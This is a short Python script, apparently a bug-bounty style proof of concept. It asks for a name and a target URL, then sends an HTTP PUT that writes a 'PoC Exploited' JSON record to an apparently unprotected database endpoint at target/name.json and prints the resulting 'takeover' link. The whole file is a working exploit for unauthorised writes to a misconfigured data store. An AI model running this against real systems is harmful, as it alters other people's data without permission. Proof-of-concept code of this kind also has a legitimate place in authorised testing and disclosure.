import requests
hacker = input("PoC Name: ")
target = input("Target URL: ")
url = f"{target}/{hacker}.json"
data= {"PoC":"Exploited", "BY": hacker}
reponse = requests.put(url, json=data)

print("PoC Done!\n")
print(f"Takeover Link => {url}")
